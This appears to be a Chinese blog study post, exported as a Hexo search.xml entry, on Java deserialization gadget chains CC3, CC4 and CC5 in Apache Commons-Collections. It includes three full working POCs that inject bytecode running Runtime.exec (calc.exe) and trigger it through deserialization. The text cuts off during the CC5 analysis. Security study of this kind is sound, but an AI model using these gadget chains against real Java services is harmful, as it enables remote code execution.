<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>CC链学习下</title>
      <link href="/2023/09/21/CC%E9%93%BE%E5%AD%A6%E4%B9%A0%E4%B8%8B/"/>
      <url>/2023/09/21/CC%E9%93%BE%E5%AD%A6%E4%B9%A0%E4%B8%8B/</url>
      
        <content type="html"><![CDATA[<h1 id="CC链学习下："><a href="#CC链学习下：" class="headerlink" title="CC链学习下："></a>CC链学习下：</h1><h2 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h2><p>这次直接尝试一口气跟完链子，然后转进下一部分了。</p><h2 id="CC链3："><a href="#CC链3：" class="headerlink" title="CC链3："></a>CC链3：</h2><blockquote><p>jdk 1.7</p><p>commons-collections-3.1</p></blockquote><p>还是从ysoserial的源码入手。</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20230522174835014.png" alt="image-20230522174835014"></p><p>这里告诉我们是改变了CC1链子，通过InstantiateTransformer去替换了InvokerTransformer。</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20230522175304087.png" alt="image-20230522175304087"></p><p>在这里，创建ChainedTransformer类的时候是随便添加的一个元素，后面会通过反射方式去重新换成<code>Transformer[]</code>数组</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20230522175453300.png" alt="image-20230522175453300"></p><p>然后下方通过LazyMap的decorate()函数调用的时候，就是首先返回<code>TrAXFilter.class</code>，然后调用<code>InstantiateTransformer#transform()</code>。</p><p>看一下这个类的transform()函数。</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20230522182952054.png" alt="image-20230522182952054"></p><p>这里重点很显然是else中的newInstance()。也就是通过反射的方式，创建了input参数对应类的实例。</p><p>if限制了我们传入的input参数，必须是Class类或是Class的子类。</p><p>当我们newInstance()之后，就会触发<code>com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter</code>类中的构造方法。</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20230522184054704.png" alt="image-20230522184054704"></p><p>通过这里的newTransformer()去触发动态加载字节码的那条链子。</p><h3 id="构造CC3的POC"><a href="#构造CC3的POC" class="headerlink" title="构造CC3的POC:"></a>构造CC3的POC:</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.*;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InstantiateTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Retention;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">POC</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">            pool.insertClassPath(<span class="keyword">new</span> <span class="title class_">ClassClassPath</span>(com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet.class));</span><br><span class="line">            <span class="type">CtClass</span> <span class="variable">poc</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;Poc&quot;</span>);</span><br><span class="line">            <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;C:\\\\Windows\\\\WinSxS\\\\wow64_microsoft-windows-calc_31bf3856ad364e35_10.0.19041.1_none_6a03b910ee7a4073\\\\calc.exe\&quot;);&quot;</span>;</span><br><span class="line">            poc.makeClassInitializer().insertBefore(cmd);</span><br><span class="line">            <span class="type">String</span> <span class="variable">RandName</span> <span class="operator">=</span> <span class="string">&quot;POC&quot;</span>+System.nanoTime();</span><br><span class="line">            poc.setName(RandName);</span><br><span class="line">            poc.setSuperclass(pool.get(com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet.class.getName()));</span><br><span class="line">            <span class="type">byte</span>[] classbyte = poc.toBytecode();</span><br><span class="line">            <span class="type">byte</span>[][] trueclassbyte = <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;classbyte&#125;;</span><br><span class="line">            <span class="comment">//反射设置值</span></span><br><span class="line">            <span class="type">Field</span> <span class="variable">field2</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>).getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">            field2.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            field2.set(templates,trueclassbyte);</span><br><span class="line">            <span class="type">Field</span> <span class="variable">field3</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>).getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">            field3.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            field3.set(templates,<span class="string">&quot;Ho1L0w-By&quot;</span>);</span><br><span class="line">            <span class="type">Field</span> <span class="variable">field4</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>).getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">            field4.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            field4.set(templates,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">        &#125; <span class="keyword">catch</span> (CannotCompileException | NotFoundException | IOException | ClassNotFoundException |</span><br><span class="line">                 NoSuchFieldException | IllegalAccessException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125;</span><br><span class="line">        Transformer[] transformer = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">chainedtransform</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformer);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        innerMap.put(<span class="string">&quot;value&quot;</span>,<span class="string">&quot;xxxx&quot;</span>);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> TransformedMap.decorate(innerMap,<span class="literal">null</span>,chainedtransform);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">            <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> clazz.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">            constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="type">Object</span> <span class="variable">instance</span> <span class="operator">=</span> constructor.newInstance(Retention.class,outerMap);</span><br><span class="line">            <span class="type">FileOutputStream</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;./CC3.ser&quot;</span>);</span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">output</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(file);</span><br><span class="line">            output.writeObject(instance);</span><br><span class="line">            <span class="type">FileInputStream</span> <span class="variable">file1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;./CC3.ser&quot;</span>);</span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">input</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(file1);</span><br><span class="line">            input.readObject();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (FileNotFoundException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InvocationTargetException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchMethodException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InstantiationException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalAccessException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20230524003945372.png" alt="image-20230524003945372"></p><h3 id="使用LazyMap的POC"><a href="#使用LazyMap的POC" class="headerlink" title="使用LazyMap的POC:"></a>使用LazyMap的POC:</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.*;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InstantiateTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Retention;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">POC</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">            pool.insertClassPath(<span class="keyword">new</span> <span class="title class_">ClassClassPath</span>(com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet.class));</span><br><span class="line">            <span class="type">CtClass</span> <span class="variable">poc</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;Poc&quot;</span>);</span><br><span class="line">            <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;C:\\\\Windows\\\\WinSxS\\\\wow64_microsoft-windows-calc_31bf3856ad364e35_10.0.19041.1_none_6a03b910ee7a4073\\\\calc.exe\&quot;);&quot;</span>;</span><br><span class="line">            poc.makeClassInitializer().insertBefore(cmd);</span><br><span class="line">            <span class="type">String</span> <span class="variable">RandName</span> <span class="operator">=</span> <span class="string">&quot;POC&quot;</span>+System.nanoTime();</span><br><span class="line">            poc.setName(RandName);</span><br><span class="line">            poc.setSuperclass(pool.get(com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet.class.getName()));</span><br><span class="line">            <span class="type">byte</span>[] classbyte = poc.toBytecode();</span><br><span class="line">            <span class="type">byte</span>[][] trueclassbyte = <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;classbyte&#125;;</span><br><span class="line">            <span class="comment">//反射设置值</span></span><br><span class="line">            <span class="type">Field</span> <span class="variable">field2</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>).getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">            field2.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            field2.set(templates,trueclassbyte);</span><br><span class="line">            <span class="type">Field</span> <span class="variable">field3</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>).getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">            field3.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            field3.set(templates,<span class="string">&quot;Ho1L0w-By&quot;</span>);</span><br><span class="line">            <span class="type">Field</span> <span class="variable">field4</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>).getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">            field4.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            field4.set(templates,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">        &#125; <span class="keyword">catch</span> (CannotCompileException | NotFoundException | IOException | ClassNotFoundException |</span><br><span class="line">                 NoSuchFieldException | IllegalAccessException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125;</span><br><span class="line">        Transformer[] transformer = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">chainedtransform</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformer);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        innerMap.put(<span class="string">&quot;value&quot;</span>,<span class="string">&quot;xxxx&quot;</span>);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap,chainedtransform);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">            <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> clazz.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">            constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> (InvocationHandler)constructor.newInstance(Retention.class,outerMap);</span><br><span class="line">            <span class="type">Map</span> <span class="variable">proxyMap</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(),<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;,handler);</span><br><span class="line">            <span class="type">Object</span> <span class="variable">instance</span> <span class="operator">=</span> constructor.newInstance(Retention.class,proxyMap);</span><br><span class="line">            <span class="type">FileOutputStream</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;./CC3.ser&quot;</span>);</span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">output</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(file);</span><br><span class="line">            output.writeObject(instance);</span><br><span class="line">            <span class="type">FileInputStream</span> <span class="variable">file1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;./CC3.ser&quot;</span>);</span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">input</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(file1);</span><br><span class="line">            input.readObject();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (FileNotFoundException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InvocationTargetException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchMethodException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InstantiationException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalAccessException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>挺奇怪的是，这里执行完</p><p><code>Map proxyMap = (Map) Proxy.*newProxyInstance*(LazyMap.class.getClassLoader(),new Class[]&#123;Map.class&#125;,handler);</code></p><p>语句后，会弹出一次计算器，应该是在什么调用的过程中调用到了newInstance()，然后创建了一个类，提前触发了吧。</p><p>调试了一会儿没看出来。</p><h2 id="CC链4："><a href="#CC链4：" class="headerlink" title="CC链4："></a>CC链4：</h2><blockquote><p>jdk 1.7</p><p>commons-collections4-4.0</p></blockquote><p>实际上这条链子就是一个CC2链的升级版本，也就是不使用InvokerTransformer类，来触发<code>newTransformer()</code>方法，进而调用动态加载字节码的TemplateImpl类。</p><p>而是像我们之前学习的CC3链一样，通过InstantiateTransformer()和TrAXFilter类来触发<code>newTransformer()</code>方法。</p><p>整条调用链其实都已经分析过了，这里直接写POC：</p><h3 id="构造CC4的POC"><a href="#构造CC4的POC" class="headerlink" title="构造CC4的POC:"></a>构造CC4的POC:</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.*;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InstantiateTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">POC</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> CannotCompileException, NotFoundException, IOException, NoSuchFieldException, IllegalAccessException &#123;</span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">queue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(<span class="number">1</span>);</span><br><span class="line">        queue.add(<span class="number">1</span>);</span><br><span class="line">        queue.add(<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassPool</span>().getDefault();</span><br><span class="line">        pool.insertClassPath(<span class="keyword">new</span> <span class="title class_">ClassClassPath</span>(com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet.class));</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">poc</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;Poc&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;C:\\\\Windows\\\\WinSxS\\\\wow64_microsoft-windows-calc_31bf3856ad364e35_10.0.19041.1_none_6a03b910ee7a4073\\\\calc.exe\&quot;);&quot;</span>;</span><br><span class="line">        poc.makeClassInitializer().insertBefore(cmd);</span><br><span class="line">        <span class="type">String</span> <span class="variable">randname</span> <span class="operator">=</span> <span class="string">&quot;Poc&quot;</span>+System.nanoTime();</span><br><span class="line">        poc.setName(randname);</span><br><span class="line">        poc.setSuperclass(pool.get(com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet.class.getName()));</span><br><span class="line">        <span class="type">byte</span>[] classbyte = poc.toBytecode();</span><br><span class="line">        <span class="type">byte</span>[][] truebyte = <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;classbyte&#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setValue(templates,<span class="string">&quot;_bytecodes&quot;</span>,truebyte);</span><br><span class="line">        setValue(templates,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;Ho1L0w-By&quot;</span>);</span><br><span class="line">        setValue(templates,<span class="string">&quot;_tfactory&quot;</span>,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        Transformer[] transformer = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">chain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformer);</span><br><span class="line"></span><br><span class="line">        <span class="type">TransformingComparator</span> <span class="variable">comparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(chain);</span><br><span class="line">        setValue(queue,<span class="string">&quot;comparator&quot;</span>,comparator);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="type">FileOutputStream</span> <span class="variable">output</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;./CC4.ser&quot;</span>);</span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">ob</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(output);</span><br><span class="line">            ob.writeObject(queue);</span><br><span class="line"></span><br><span class="line">            <span class="type">FileInputStream</span> <span class="variable">input</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;./CC4.ser&quot;</span>);</span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">ob2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(input);</span><br><span class="line">            ob2.readObject();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setValue</span><span class="params">(Object object, String name, Object value)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> object.getClass().getDeclaredField(name);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(object,value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这一次我添加了setValue()函数，用于反射，修改值。</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20230526151359010.png" alt="image-20230526151359010"></p><h2 id="CC链5："><a href="#CC链5：" class="headerlink" title="CC链5："></a>CC链5：</h2><blockquote><p>jdk 1.8</p><p>common-collections 3.1</p></blockquote><p>首先先看一下ysoserial中的调用栈：</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20230526152559630.png" alt="image-20230526152559630"></p><p>可以看到最后命令执行的部分，其实就是CC1中的命令执行方式。</p><p>主要是进入命令执行前的部分不一样。</p><blockquote><p>BadAttributeValueException.readObject()-&gt;</p><p>TiedMapEntry.toString()-&gt;</p><p>LazyMap.get()</p></blockquote><p>稍微看一下：</p><p><code>BadAttributeValueExpException#readObject():</code></p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20230526153039580.png" alt="image-20230526153039580"></p><p>前两行用于获取ois中，名为val元素的值。</p><p>然后下面进行几个if判断，我们的目标是进入到第二个elseif中，然后去调用toString()函数。</p><p>根据调用栈，可以知道我们这里是在尝试调用<code>TiedMapEntry#toString()</code></p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20230526153922077.png" 